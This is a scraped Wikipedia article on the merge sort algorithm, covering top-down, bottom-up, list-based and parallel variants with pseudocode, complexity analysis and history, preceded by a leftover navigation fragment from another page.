Dirichlet generalized Dirichlet multivariate Laplace multivariate normal multivariate stable multivariate t normal-inverse-gamma normal-gamma Matrix-valued inverse matrix gamma inverse-Wishart matrix normal matrix t matrix gamma normal-inverse-Wishart normal-Wishart Wishart Directional Univariate (circular) directional Circular uniform univariate von Mises wrapped normal wrapped Cauchy wrapped exponential wrapped asymmetric Laplace wrapped Lévy Bivariate (spherical) Kent Bivariate (toroidal) bivariate von Mises Multivariate von Mises–Fisher Bingham Degenerate and singular Degenerate Dirac delta function Singular Cantor Families Circular compound Poisson elliptical exponential natural exponential location–scale maximum entropy mixture Pearson Tweedie wrapped Retrieved from "https://en.wikipedia.org/w/index.php?title=Discrete_uniform_distribution&oldid=979586022" Categories: Discrete distributionsLocation-scale family probability distributions Navigation menu Personal tools Not logged inTalkContributionsCreate accountLog in Namespaces ArticleTalk Variants Views ReadEditView history More Search Navigation Main pageContentsCurrent eventsRandom articleAbout WikipediaContact usDonate Contribute HelpLearn to editCommunity portalRecent changesUpload file Tools What links hereRelated changesUpload fileSpecial pagesPermanent linkPage informationCite this pageWikidata item Print/export Download as PDFPrintable version Languages العربيةAsturianuCatalàDeutschEspañolEsperantoEuskaraفارسیFrançaisGalego한국어ItalianoעבריתMagyarNederlands日本語PolskiРусскийSlovenščinaСрпски / srpskiSundaSuomiไทยTürkçeУкраїнська粵語中文 Edit links This page was last edited on 21 September 2020, at 15:34 (UTC). Text is available under the Creative Commons Attribution-ShareAlike License; additional terms may apply. By using this site, you agree to the Terms of Use and Privacy Policy. Wikipedia® is a registered trademark of the Wikimedia Foundation, Inc., a non-profit organization. Privacy policy About Wikipedia Disclaimers Contact Wikipedia Mobile view Developers Statistics Cookie statement

Merge sort - Wikipedia Merge sort From Wikipedia, the free encyclopedia Jump to navigation Jump to search A divide and combine sorting algorithm This article possibly contains original research. Please improve it by verifying the claims made and adding inline citations. Statements consisting only of original research should be removed. (May 2016) (Learn how and when to remove this template message) Merge sortAn example of merge sort. First divide the list into the smallest unit (1 element), then compare each element with the adjacent list to sort and merge the two adjacent lists. Finally all the elements are sorted and merged.ClassSorting algorithmData structureArrayWorst-case performance O ( n log ⁡ n ) {\displaystyle O(n\log n)} Best-case performance Ω ( n log ⁡ n ) {\displaystyle \Omega (n\log n)} typical, Ω ( n ) {\displaystyle \Omega (n)} natural variantAverage performance Θ ( n log ⁡ n ) {\displaystyle \Theta (n\log n)} Worst-case space complexity O ( n ) {\displaystyle O(n)} total with O ( n ) {\displaystyle O(n)} auxiliary, O ( 1 ) {\displaystyle O(1)} auxiliary with linked lists[1] In computer science, merge sort (also commonly spelled mergesort) is an efficient, general-purpose, comparison-based sorting algorithm. Most implementations produce a stable sort, which means that the order of equal elements is the same in the input and output. Merge sort is a divide and conquer algorithm that was invented by John von Neumann in 1945.[2] A detailed description and analysis of bottom-up merge sort appeared in a report by Goldstine and von Neumann as early as 1948.[3] Contents 1 Algorithm 1.1 Top-down implementation 1.2 Bottom-up implementation 1.3 Top-down implementation using lists 1.4 Bottom-up implementation using lists 2 Natural merge sort 3 Analysis 4 Variants 5 Use with tape drives 6 Optimizing merge sort 7 Parallel merge sort 7.1 Merge sort with parallel recursion 7.2 Merge sort with parallel merging 7.3 Parallel multiway merge sort 7.3.1 Basic Idea 7.3.2 Multisequence selection 7.3.3 Pseudocode 7.3.4 Analysis 7.3.5 Practical adaption and application 7.4 Further Variants 8 Comparison with other sort algorithms 9 Notes 10 References 11 External links Algorithm[edit] Conceptually, a merge sort works as follows: Divide the unsorted list into n sublists, each containing one element (a list of one element is considered sorted). Repeatedly merge sublists to produce new sorted sublists until there is only one sublist remaining. This will be the sorted list. Top-down implementation[edit] Example C-like code using indices for top-down merge sort algorithm that recursively splits the list (called runs in this example) into sublists until sublist size is 1, then merges those sublists to produce a sorted list. The copy back step is avoided with alternating the direction of the merge with each level of recursion (except for an initial one time copy). To help understand this, consider an array with 2 elements. The elements are copied to B[], then merged back to A[]. If there are 4 elements, when the bottom of recursion level is reached, single element runs from A[] are merged to B[], and then at the next higher level of recursion, those 2 element runs are merged to A[]. This pattern continues with each level of recursion. // Array A[] has the items to sort; array B[] is a work array. void TopDownMergeSort(A[], B[], n) { CopyArray(A, 0, n, B); // one time copy of A[] to B[] TopDownSplitMerge(B, 0, n, A); // sort data from B[] into A[] } // Sort the given run of array A[] using array B[] as a source. // iBegin is inclusive; iEnd is exclusive (A[iEnd] is not in the set). void TopDownSplitMerge(B[], iBegin, iEnd, A[]) { if(iEnd - iBegin <= 1) // if run size == 1 return; // consider it sorted // split the run longer than 1 item into halves iMiddle = (iEnd + iBegin) / 2; // iMiddle = mid point // recursively sort both runs from array A[] into B[] TopDownSplitMerge(A, iBegin, iMiddle, B); // sort the left run TopDownSplitMerge(A, iMiddle, iEnd, B); // sort the right run // merge the resulting runs from array B[] into A[] TopDownMerge(B, iBegin, iMiddle, iEnd, A); } // Left source half is A[ iBegin:iMiddle-1]. // Right source half is A[iMiddle:iEnd-1 ]. // Result is B[ iBegin:iEnd-1 ]. void TopDownMerge(A[], iBegin, iMiddle, iEnd, B[]) { i = iBegin, j = iMiddle; // While there are elements in the left or right runs... for (k = iBegin; k < iEnd; k++) { // If left run head exists and is <= existing right run head. if (i < iMiddle && (j >= iEnd || A[i] <= A[j])) { B[k] = A[i]; i = i + 1; } else { B[k] = A[j]; j = j + 1; } } } void CopyArray(A[], iBegin, iEnd, B[]) { for(k = iBegin; k < iEnd; k++) B[k] = A[k]; } Sorting the entire array is accomplished by TopDownMergeSort(A, B, length(A)). Bottom-up implementation[edit] Example C-like code using indices for bottom-up merge sort algorithm which treats the list as an array of n sublists (called runs in this example) of size 1, and iteratively merges sub-lists back and forth between two buffers: // array A[] has the items to sort; array B[] is a work array void BottomUpMergeSort(A[], B[], n) { // Each 1-element run in A is already "sorted". // Make successively longer sorted runs of length 2, 4, 8, 16... until whole array is sorted. for (width = 1; width < n; width = 2 * width) { // Array A is full of runs of length width. for (i = 0; i < n; i = i + 2 * width) { // Merge two runs: A[i:i+width-1] and A[i+width:i+2*width-1] to B[] // or copy A[i:n-1] to B[] ( if(i+width >= n) ) BottomUpMerge(A, i, min(i+width, n), min(i+2*width, n), B); } // Now work array B is full of runs of length 2*width. // Copy array B to array A for next iteration. // A more efficient implementation would swap the roles of A and B. CopyArray(B, A, n); // Now array A is full of runs of length 2*width. } } // Left run is A[iLeft :iRight-1]. // Right run is A[iRight:iEnd-1 ]. void BottomUpMerge(A[], iLeft, iRight, iEnd, B[]) { i = iLeft, j = iRight; // While there are elements in the left or right runs... for (k = iLeft; k < iEnd; k++) { // If left run head exists and is <= existing right run head. if (i < iRight && (j >= iEnd || A[i] <= A[j])) { B[k] = A[i]; i = i + 1; } else { B[k] = A[j]; j = j + 1; } } } void CopyArray(B[], A[], n) { for(i = 0; i < n; i++) A[i] = B[i]; } Top-down implementation using lists[edit] Pseudocode for top-down merge sort algorithm which recursively divides the input list into smaller sublists until the sublists are trivially sorted, and then merges the sublists while returning up the call chain. function merge_sort(list m) is // Base case. A list of zero or one elements is sorted, by definition. if length of m ≤ 1 then return m // Recursive case. First, divide the list into equal-sized sublists // consisting of the first half and second half of the list. // This assumes lists start at index 0. var left := empty list var right := empty list for each x with index i in m do if i < (length of m)/2 then add x to left else add x to right // Recursively sort both sublists. left := merge_sort(left) right := merge_sort(right) // Then merge the now-sorted sublists. return merge(left, right) In this example, the merge function merges the left and right sublists. function merge(left, right) is var result := empty list while left is not empty and right is not empty do if first(left) ≤ first(right) then append first(left) to result left := rest(left) else append first(right) to result right := rest(right) // Either left or right may have elements left; consume them. // (Only one of the following loops will actually be entered.) while left is not empty do append first(left) to result left := rest(left) while right is not empty do append first(right) to result right := rest(right) return result Bottom-up implementation using lists[edit] Pseudocode for bottom-up merge sort algorithm which uses a small fixed size array of references to nodes, where array[i] is either a reference to a list of size 2i or nil. node is a reference or pointer to a node. The merge() function would be similar to the one shown in the top-down merge lists example, it merges two already sorted lists, and handles empty lists. In this case, merge() would use node for its input parameters and return value. function merge_sort(node head) is // return if empty list if head = nil then return nil var node array[32]; initially all nil var node result var node next var int i result := head // merge nodes into array while result ≠ nil do next := result.next; result.next := nil for (i = 0; (i < 32) && (array[i] ≠ nil); i += 1) do result := merge(array[i], result) array[i] := nil // do not go past end of array if i = 32 then i -= 1 array[i] := result result := next // merge array into single list result := nil for (i = 0; i < 32; i += 1) do result := merge(array[i], result) return result Natural merge sort[edit] A natural merge sort is similar to a bottom-up merge sort except that any naturally occurring runs (sorted sequences) in the input are exploited. Both monotonic and bitonic (alternating up/down) runs may be exploited, with lists (or equivalently tapes or files) being convenient data structures (used as FIFO queues or LIFO stacks).[4] In the bottom-up merge sort, the starting point assumes each run is one item long. In practice, random input data will have many short runs that just happen to be sorted. In the typical case, the natural merge sort may not need as many passes because there are fewer runs to merge. In the best case, the input is already sorted (i.e., is one run), so the natural merge sort need only make one pass through the data. In many practical cases, long natural runs are present, and for that reason natural merge sort is exploited as the key component of Timsort. Example: Start : 3 4 2 1 7 5 8 9 0 6 Select runs : (3 4)(2)(1 7)(5 8 9)(0 6) Merge : (2 3 4)(1 5 7 8 9)(0 6) Merge : (1 2 3 4 5 7 8 9)(0 6) Merge : (0 1 2 3 4 5 6 7 8 9) Tournament replacement selection sorts are used to gather the initial runs for external sorting algorithms. Analysis[edit] A recursive merge sort algorithm used to sort an array of 7 integer values. These are the steps a human would take to emulate merge sort (top-down). In sorting n objects, merge sort has an average and worst-case performance of O(n log n). If the running time of merge sort for a list of length n is T(n), then the recurrence relation T(n) = 2T(n/2) + n follows from the definition of the algorithm (apply the algorithm to two lists of half the size of the original list, and add the n steps taken to merge the resulting two lists). The closed form follows from the master theorem for divide-and-conquer recurrences. The number of comparisons made by merge sort in the worst case is given by the sorting numbers. These numbers are equal to or slightly smaller than (n ⌈lg n⌉ − 2⌈lg n⌉ + 1), which is between (n lg n − n + 1) and (n lg n + n + O(lg n)).[5] Merge sort's best case takes about half as many iterations as its worst case.[citation needed] For large n and a randomly ordered input list, merge sort's expected (average) number of comparisons approaches α·n fewer than the worst case, where α = − 1 + ∑ k = 0 ∞ 1 2 k + 1 ≈ 0.2645. {\displaystyle \alpha =-1+\sum _{k=0}^{\infty }{\frac {1}{2^{k}+1}}\approx 0.2645.} In the worst case, merge sort uses approximately 39% fewer comparisons than quicksort does in its average case, and in terms of moves, merge sort's worst case complexity is O(n log n) - the same complexity as quicksort's best case.[citation needed] Merge sort is more efficient than quicksort for some types of lists if the data to be sorted can only be efficiently accessed sequentially, and is thus popular in languages such as Lisp, where sequentially accessed data structures are very common. Unlike some (efficient) implementations of quicksort, merge sort is a stable sort. Merge sort's most common implementation does not sort in place;[6] therefore, the memory size of the input must be allocated for the sorted output to be stored in (see below for variations that need only n/2 extra spaces). Variants[edit] Variants of merge sort are primarily concerned with reducing the space complexity and the cost of copying. A simple alternative for reducing the space overhead to n/2 is to maintain left and right as a combined structure, copy only the left part of m into temporary space, and to direct the merge routine to place the merged output into m. With this version it is better to allocate the temporary space outside the merge routine, so that only one allocation is needed. The excessive copying mentioned previously is also mitigated, since the last pair of lines before the return result statement (function merge in the pseudo code above) become superfluous. One drawback of merge sort, when implemented on arrays, is its O(n) working memory requirement. Several in-place variants have been suggested: Katajainen et al. present an algorithm that requires a constant amount of working memory: enough storage space to hold one element of the input array, and additional space to hold O(1) pointers into the input array. They achieve an O(n log n) time bound with small constants, but their algorithm is not stable.[7] Several attempts have been made at producing an in-place merge algorithm that can be combined with a standard (top-down or bottom-up) merge sort to produce an in-place merge sort. In this case, the notion of "in-place" can be relaxed to mean "taking logarithmic stack space", because standard merge sort requires that amount of space for its own stack usage. It was shown by Geffert et al. that in-place, stable merging is possible in O(n log n) time using a constant amount of scratch space, but their algorithm is complicated and has high constant factors: merging arrays of length n and m can take 5n + 12m + o(m) moves.[8] This high constant factor and complicated in-place algorithm was made simpler and easier to understand. Bing-Chao Huang and Michael A. Langston[9] presented a straightforward linear time algorithm practical in-place merge to merge a sorted list using fixed amount of additional space. They both have used the work of Kronrod and others. It merges in linear time and constant extra space. The algorithm takes little more average time than standard merge sort algorithms, free to exploit O(n) temporary extra memory cells, by less than a factor of two. Though the algorithm is much faster in a practical way but it is unstable also for some lists. But using similar concepts, they have been able to solve this problem. Other in-place algorithms include SymMerge, which takes O((n + m) log (n + m)) time in total and is stable.[10] Plugging such an algorithm into merge sort increases its complexity to the non-linearithmic, but still quasilinear, O(n (log n)2). A modern stable linear and in-place merging is block merge sort. An alternative to reduce the copying into multiple lists is to associate a new field of information with each key (the elements in m are called keys). This field will be used to link the keys and any associated information together in a sorted list (a key and its related information is called a record). Then the merging of the sorted lists proceeds by changing the link values; no records need to be moved at all. A field which contains only a link will generally be smaller than an entire record so less space will also be used. This is a standard sorting technique, not restricted to merge sort. Use with tape drives[edit] Merge sort type algorithms allowed large data sets to be sorted on early computers that had small random access memories by modern standards. Records were stored on magnetic tape and processed on banks of magnetic tape drives, such as these IBM 729s. An external merge sort is practical to run using disk or tape drives when the data to be sorted is too large to fit into memory. External sorting explains how merge sort is implemented with disk drives. A typical tape drive sort uses four tape drives. All I/O is sequential (except for rewinds at the end of each pass). A minimal implementation can get by with just two record buffers and a few program variables. Naming the four tape drives as A, B, C, D, with the original data on A, and using only two record buffers, the algorithm is similar to the bottom-up implementation, using pairs of tape drives instead of arrays in memory. The basic algorithm can be described as follows: Merge pairs of records from A; writing two-record sublists alternately to C and D. Merge two-record sublists from C and D into four-record sublists; writing these alternately to A and B. Merge four-record sublists from A and B into eight-record sublists; writing these alternately to C and D Repeat until you have one list containing all the data, sorted—in log2(n) passes. Instead of starting with very short runs, usually a hybrid algorithm is used, where the initial pass will read many records into memory, do an internal sort to create a long run, and then distribute those long runs onto the output set. The step avoids many early passes. For example, an internal sort of 1024 records will save nine passes. The internal sort is often large because it has such a benefit. In fact, there are techniques that can make the initial runs longer than the available internal memory.[11] With some overhead, the above algorithm can be modified to use three tapes. O(n log n) running time can also be achieved using two queues, or a stack and a queue, or three stacks. In the other direction, using k > two tapes (and O(k) items in memory), we can reduce the number of tape operations in O(log k) times by using a k/2-way merge. A more sophisticated merge sort that optimizes tape (and disk) drive usage is the polyphase merge sort. Optimizing merge sort[edit] Tiled merge sort applied to an array of random integers. The horizontal axis is the array index and the vertical axis is the integer. On modern computers, locality of reference can be of paramount importance in software optimization, because multilevel memory hierarchies are used. Cache-aware versions of the merge sort algorithm, whose operations have been specifically chosen to minimize the movement of pages in and out of a machine's memory cache, have been proposed. For example, the tiled merge sort algorithm stops partitioning subarrays when subarrays of size S are reached, where S is the number of data items fitting into a CPU's cache. Each of these subarrays is sorted with an in-place sorting algorithm such as insertion sort, to discourage memory swaps, and normal merge sort is then completed in the standard recursive fashion. This algorithm has demonstrated better performance[example needed] on machines that benefit from cache optimization. (LaMarca & Ladner 1997) Kronrod (1969) suggested an alternative version of merge sort that uses constant additional space. This algorithm was later refined. (Katajainen, Pasanen & Teuhola 1996) Also, many applications of external sorting use a form of merge sorting where the input get split up to a higher number of sublists, ideally to a number for which merging them still makes the currently processed set of pages fit into main memory. Parallel merge sort[edit] Merge sort parallelizes well due to the use of the divide-and-conquer method. Several different parallel variants of the algorithm have been developed over the years. Some parallel merge sort algorithms are strongly related to the sequential top-down merge algorithm while others have a different general structure and use the K-way merge method. Merge sort with parallel recursion[edit] The sequential merge sort procedure can be described in two phases, the divide phase and the merge phase. The first consists of many recursive calls that repeatedly perform the same division process until the subsequences are trivially sorted (containing one or no element). An intuitive approach is the parallelization of those recursive calls.[12] Following pseudocode describes the merge sort with parallel recursion using the fork and join keywords: // Sort elements lo through hi (exclusive) of array A. algorithm mergesort(A, lo, hi) is if lo+1 < hi then // Two or more elements. mid := ⌊(lo + hi) / 2⌋ fork mergesort(A, lo, mid) mergesort(A, mid, hi) join merge(A, lo, mid, hi) This algorithm is the trivial modification of the sequential version and does not parallelize well. Therefore, its speedup is not very impressive. It has a span of Θ ( n ) {\displaystyle \Theta (n)} , which is only an improvement of Θ ( log ⁡ n ) {\displaystyle \Theta (\log n)} compared to the sequential version (see Introduction to Algorithms). This is mainly due to the sequential merge method, as it is the bottleneck of the parallel executions. Merge sort with parallel merging[edit] Main article: Merge algorithm § Parallel merge Better parallelism can be achieved by using a parallel merge algorithm. Cormen et al. present a binary variant that merges two sorted sub-sequences into one sorted output sequence.[12] In one of the sequences (the longer one if unequal length), the element of the middle index is selected. Its position in the other sequence is determined in such a way that this sequence would remain sorted if this element were inserted at this position. Thus, one knows how many other elements from both sequences are smaller and the position of the selected element in the output sequence can be calculated. For the partial sequences of the smaller and larger elements created in this way, the merge algorithm is again executed in parallel until the base case of the recursion is reached. The following pseudocode shows the modified parallel merge sort method using the parallel merge algorithm (adopted from Cormen et al.). /** * A: Input array * B: Output array * lo: lower bound * hi: upper bound * off: offset */ algorithm parallelMergesort(A, lo, hi, B, off) is len := hi - lo + 1 if len == 1 then B[off] := A[lo] else let T[1..len] be a new array mid := ⌊(lo + hi) / 2⌋ mid' := mid - lo + 1 fork parallelMergesort(A, lo, mid, T, 1) parallelMergesort(A, mid + 1, hi, T, mid' + 1) join parallelMerge(T, 1, mid', mid' + 1, len, B, off) In order to analyze a recurrence relation for the worst case span, the recursive calls of parallelMergesort have to be incorporated only once due to their parallel execution, obtaining T ∞ sort ( n ) = T ∞ sort ( n 2 ) + T ∞ merge ( n ) = T ∞ sort ( n 2 ) + Θ ( log ⁡ ( n ) 2 ) {\textstyle T_{\infty }^{\text{sort}}(n)=T_{\infty }^{\text{sort}}\left({\frac {n}{2}}\right)+T_{\infty }^{\text{merge}}(n)=T_{\infty }^{\text{sort}}\left({\frac {n}{2}}\right)+\Theta \left(\log(n)^{2}\right)} . For detailed information about the complexity of the parallel merge procedure, see Merge algorithm. The solution of this recurrence is given by T ∞ sort = Θ ( log ⁡ ( n ) 3 ) {\textstyle T_{\infty }^{\text{sort}}=\Theta \left(\log(n)^{3}\right)} . This parallel merge algorithm reaches a parallelism of Θ ( n ( log ⁡ n ) 2 ) {\displaystyle \Theta {\biggr (}{n \over (\log n)^{2}}{\biggr )}} , which is much higher than the parallelism of the previous algorithm. Such a sort can perform well in practice when combined with a fast stable sequential sort, such as insertion sort, and a fast sequential merge as a base case for merging small arrays.[13] Parallel multiway merge sort[edit] It seems arbitrary to restrict the merge sort algorithms to a binary merge method, since there are usually p > 2 processors available. A better approach may be to use a K-way merge method, a generalization of binary merge, in which k {\displaystyle k} sorted sequences are merged together. This merge variant is well suited to describe a sorting algorithm on a PRAM.[14][15] Basic Idea[edit] The parallel multiway mergesort process on four processors t 0 {\displaystyle t_{0}} to t 3 {\displaystyle t_{3}} . Given an unsorted sequence of n {\displaystyle n} elements, the goal is to sort the sequence with p {\displaystyle p} available processors. These elements are distributed equally among all processors and sorted locally using a sequential Sorting algorithm. Hence, the sequence consists of sorted sequences S 1 , . . . , S p {\displaystyle S_{1},...,S_{p}} of length ⌈ n p ⌉ {\textstyle \lceil {\frac {n}{p}}\rceil } . For simplification let n {\displaystyle n} be a multiple of p {\displaystyle p} , so that | S i | = n p {\textstyle \left\vert S_{i}\right\vert ={\frac {n}{p}}} for i = 1 , . . . , p {\displaystyle i=1,...,p} . These sequences will be used to perform a multisequence selection/splitter selection. For j = 1 , . . . , p {\displaystyle j=1,...,p} , the algorithm determines splitter elements v j {\displaystyle v_{j}} with global rank k = j n p {\textstyle k=j{\frac {n}{p}}} . Then the corresponding positions of v 1 , . . . , v p {\displaystyle v_{1},...,v_{p}} in each sequence S i {\displaystyle S_{i}} are determined with binary search and thus the S i {\displaystyle S_{i}} are further partitioned into p {\displaystyle p} subsequences S i , 1 , . . . , S i , p {\displaystyle S_{i,1},...,S_{i,p}} with S i , j := { x ∈ S i | r a n k ( v j − 1 ) < r a n k ( x ) ≤ r a n k ( v j ) } {\textstyle S_{i,j}:=\{x\in S_{i}|rank(v_{j-1})<rank(x)\leq rank(v_{j})\}} . Furthermore, the elements of S 1 , i , . . . , S p , i {\displaystyle S_{1,i},...,S_{p,i}} are assigned to processor i {\displaystyle i} , means all elements between rank ( i − 1 ) n p {\textstyle (i-1){\frac {n}{p}}} and rank i n p {\textstyle i{\frac {n}{p}}} , which are distributed over all S i {\displaystyle S_{i}} . Thus, each processor receives a sequence of sorted sequences. The fact that the rank k {\displaystyle k} of the splitter elements v i {\displaystyle v_{i}} was chosen globally, provides two important properties: On the one hand, k {\displaystyle k} was chosen so that each processor can still operate on n / p {\textstyle n/p} elements after assignment. The algorithm is perfectly load-balanced. On the other hand, all elements on processor i {\displaystyle i} are less than or equal to all elements on processor i + 1 {\displaystyle i+1} . Hence, each processor performs the p-way merge locally and thus obtains a sorted sequence from its sub-sequences. Because of the second property, no further p-way-merge has to be performed, the results only have to be put together in the order of the processor number. Multisequence selection[edit] In its simplest form, given p {\displaystyle p} sorted sequences S 1 , . . . , S p {\displaystyle S_{1},...,S_{p}} distributed evenly on p {\displaystyle p} processors and a rank k {\displaystyle k} , the task is to find an element x {\displaystyle x} with a global rank k {\displaystyle k} in the union of the sequences. Hence, this can be used to divide each S i {\displaystyle S_{i}} in two parts at a splitter index l i {\displaystyle l_{i}} , where the lower part contains only elements which are smaller than x {\displaystyle x} , while the elements bigger than x {\displaystyle x} are located in the upper part. The presented sequential algorithm returns the indices of the splits in each sequence, e.g. the indices l i {\displaystyle l_{i}} in sequences S i {\displaystyle S_{i}} such that S i [ l i ] {\displaystyle S_{i}[l_{i}]} has a global rank less than k {\displaystyle k} and r a n k ( S i [ l i + 1 ] ) ≥ k {\displaystyle \mathrm {rank} \left(S_{i}[l_{i}+1]\right)\geq k} .[16] algorithm msSelect(S : Array of sorted Sequences [S_1,..,S_p], k : int) is for i = 1 to p do (l_i, r_i) = (0, |S_i|-1) while there exists i: l_i < r_i do // pick Pivot Element in S_j[l_j], .., S_j[r_j], chose random j uniformly v := pickPivot(S, l, r) for i = 1 to p do m_i = binarySearch(v, S_i[l_i, r_i]) // sequentially if m_1 + ... + m_p >= k then // m_1+ ... + m_p is the global rank of v r := m // vector assignment else l := m return l For the complexity analysis the PRAM model is chosen. If the data is evenly distributed over all p {\displaystyle p} , the p-fold execution of the binarySearch method has a running time of O ( p log ⁡ ( n / p ) ) {\displaystyle {\mathcal {O}}\left(p\log \left(n/p\right)\right)} . The expected recursion depth is O ( log ⁡ ( ∑ i | S i | ) ) = O ( log ⁡ ( n ) ) {\displaystyle {\mathcal {O}}\left(\log \left(\textstyle \sum _{i}|S_{i}|\right)\right)={\mathcal {O}}(\log(n))} as in the ordinary Quickselect. Thus the overall expected running time is O ( p log ⁡ ( n / p ) log ⁡ ( n ) ) {\displaystyle {\mathcal {O}}\left(p\log(n/p)\log(n)\right)} . Applied on the parallel multiway merge sort, this algorithm has to be invoked in parallel such that all splitter elements of rank i n p {\textstyle i{\frac {n}{p}}} for i = 1 , . . , p {\displaystyle i=1,..,p} are found simultaneously. These splitter elements can then be used to partition each sequence in p {\displaystyle p} parts, with the same total running time of O ( p log ⁡ ( n / p ) log ⁡ ( n ) ) {\displaystyle {\mathcal {O}}\left(p\,\log(n/p)\log(n)\right)} . Pseudocode[edit] Below, the complete pseudocode of the parallel multiway merge sort algorithm is given. We assume that there is a barrier synchronization before and after the multisequence selection such that every processor can determine the splitting elements and the sequence partition properly. /** * d: Unsorted Array of Elements * n: Number of Elements * p: Number of Processors * return Sorted Array */ algorithm parallelMultiwayMergesort(d : Array, n : int, p : int) is o := new Array[0, n] // the output array for i = 1 to p do in parallel // each processor in parallel S_i := d[(i-1) * n/p, i * n/p] // Sequence of length n/p sort(S_i) // sort locally synch v_i := msSelect([S_1,...,S_p], i * n/p) // element with global rank i * n/p synch (S_i,1 ,..., S_i,p) := sequence_partitioning(si, v_1, ..., v_p) // split s_i into subsequences o[(i-1) * n/p, i * n/p] := kWayMerge(s_1,i, ..., s_p,i) // merge and assign to output array return o Analysis[edit] Firstly, each processor sorts the assigned n / p {\displaystyle n/p} elements locally using a sorting algorithm with complexity O ( n / p log ⁡ ( n / p ) ) {\displaystyle {\mathcal {O}}\left(n/p\;\log(n/p)\right)} . After that, the splitter elements have to be calculated in time O ( p log ⁡ ( n / p ) log ⁡ ( n ) ) {\displaystyle {\mathcal {O}}\left(p\,\log(n/p)\log(n)\right)} . Finally, each group of p {\displaystyle p} splits have to be merged in parallel by each processor with a running time of O ( log ⁡ ( p ) n / p ) {\displaystyle {\mathcal {O}}(\log(p)\;n/p)} using a sequential p-way merge algorithm. Thus, the overall running time is given by O ( n p log ⁡ ( n p ) + p log ⁡ ( n p ) log ⁡ ( n ) + n p log ⁡ ( p ) ) {\displaystyle {\mathcal {O}}\left({\frac {n}{p}}\log \left({\frac {n}{p}}\right)+p\log \left({\frac {n}{p}}\right)\log(n)+{\frac {n}{p}}\log(p)\right)} . Practical adaption and application[edit] The multiway merge sort algorithm is very scalable through its high parallelization capability, which allows the use of many processors. This makes the algorithm a viable candidate for sorting large amounts of data, such as those processed in computer clusters. Also, since in such systems memory is usually not a limiting resource, the disadvantage of space complexity of merge sort is negligible. However, other factors become important in such systems, which are not taken into account when modelling on a PRAM. Here, the following aspects need to be considered: Memory hierarchy, when the data does not fit into the processors cache, or the communication overhead of exchanging data between processors, which could become a bottleneck when the data can no longer be accessed via the shared memory. Sanders et al. have presented in their paper a bulk synchronous parallel algorithm for multilevel multiway mergesort, which divides p {\displaystyle p} processors into r {\displaystyle r} groups of size p ′ {\displaystyle p'} . All processors sort locally first. Unlike single level multiway mergesort, these sequences are then partitioned into r {\displaystyle r} parts and assigned to the appropriate processor groups. These steps are repeated recursively in those groups. This reduces communication and especially avoids problems with many small messages. The hierarchial structure of the underlying real network can be used to define the processor groups (e.g. racks, clusters,...).[15] Further Variants[edit] Merge sort was one of the first sorting algorithms where optimal speed up was achieved, with Richard Cole using a clever subsampling algorithm to ensure O(1) merge.[17] Other sophisticated parallel sorting algorithms can achieve the same or better time bounds with a lower constant. For example, in 1991 David Powers described a parallelized quicksort (and a related radix sort) that can operate in O(log n) time on a CRCW parallel random-access machine (PRAM) with n processors by performing partitioning implicitly.[18] Powers further shows that a pipelined version of Batcher's Bitonic Mergesort at O((log n)2) time on a butterfly sorting network is in practice actually faster than his O(log n) sorts on a PRAM, and he provides detailed discussion of the hidden overheads in comparison, radix and parallel sorting.[19] Comparison with other sort algorithms[edit] Although heapsort has the same time bounds as merge sort, it requires only Θ(1) auxiliary space instead of merge sort's Θ(n). On typical modern architectures, efficient quicksort implementations generally outperform merge sort for sorting RAM-based arrays.[citation needed] On the other hand, merge sort is a stable sort and is more efficient at handling slow-to-access sequential media. Merge sort is often the best choice for sorting a linked list: in this situation it is relatively easy to implement a merge sort in such a way that it requires only Θ(1) extra space, and the slow random-access performance of a linked list makes some other algorithms (such as quicksort) perform poorly, and others (such as heapsort) completely impossible. As of Perl 5.8, merge sort is its default sorting algorithm (it was quicksort in previous versions of Perl).[20] In Java, the Arrays.sort() methods use merge sort or a tuned quicksort depending on the datatypes and for implementation efficiency switch to insertion sort when fewer than seven array elements are being sorted.[21] The Linux kernel uses merge sort for its linked lists.[22] Python uses Timsort, another tuned hybrid of merge sort and insertion sort, that has become the standard sort algorithm in Java SE 7 (for arrays of non-primitive types),[23] on the Android platform,[24] and in GNU Octave.[25] Notes[edit] ^ Skiena (2008, p. 122) ^ Knuth (1998, p. 158) ^ Katajainen, Jyrki; Träff, Jesper Larsson (March 1997). "A meticulous analysis of mergesort programs" (PDF). Proceedings of the 3rd Italian Conference on Algorithms and Complexity. Italian Conference on Algorithms and Complexity. Rome. pp. 217–228. CiteSeerX 10.1.1.86.3154. doi:10.1007/3-540-62592-5_74. ^ Powers, David M. W.; McMahon, Graham B. (1983). "A compendium of interesting prolog programs". DCS Technical Report 8313 (Report). Department of Computer Science, University of New South Wales. ^ The worst case number given here does not agree with that given in Knuth's Art of Computer Programming, Vol 3. The discrepancy is due to Knuth analyzing a variant implementation of merge sort that is slightly sub-optimal ^ Cormen et al. (2009, p. 151) harvtxt error: no target: CITEREFCormenLeisersonRivestStein2009 (help) ^ Katajainen, Pasanen & Teuhola (1996) ^ Geffert, Viliam; Katajainen, Jyrki; Pasanen, Tomi (2000). "Asymptotically efficient in-place merging". Theoretical Computer Science. 237 (1–2): 159–181. doi:10.1016/S0304-3975(98)00162-5. ^ Huang, Bing-Chao; Langston, Michael A. (March 1988). "Practical In-Place Merging". Communications of the ACM. 31 (3): 348–352. doi:10.1145/42392.42403. S2CID 4841909. ^ Kim, Pok-Son; Kutzner, Arne (2004). Stable Minimum Storage Merging by Symmetric Comparisons. European Symp. Algorithms. Lecture Notes in Computer Science. 3221. pp. 714–723. CiteSeerX 10.1.1.102.4612. doi:10.1007/978-3-540-30140-0_63. ISBN 978-3-540-23025-0. ^ Selection sort. Knuth's snowplow. Natural merge. ^ a b Cormen et al. (2009, pp. 797–805) harvtxt error: no target: CITEREFCormenLeisersonRivestStein2009 (help) ^ Victor J. Duvanenko "Parallel Merge Sort" Dr. Dobb's Journal & blog[1] and GitHub repo C++ implementation [2] ^ Peter Sanders; Johannes Singler (2008). "Lecture Parallel algorithms" (PDF). Retrieved 2020-05-02. ^ a b Axtmann, Michael; Bingmann, Timo; Sanders, Peter; Schulz, Christian (2015). "Practical Massively Parallel Sorting". Proceedings of the 27th ACM Symposium on Parallelism in Algorithms and Architectures: 13–23. doi:10.1145/2755573.2755595. ISBN 9781450335881. S2CID 18249978. ^ Peter Sanders (2019). "Lecture Parallel algorithms" (PDF). Retrieved 2020-05-02. ^ Cole, Richard (August 1988). "Parallel merge sort". SIAM J. Comput. 17 (4): 770–785. CiteSeerX 10.1.1.464.7118. doi:10.1137/0217049. S2CID 2416667. 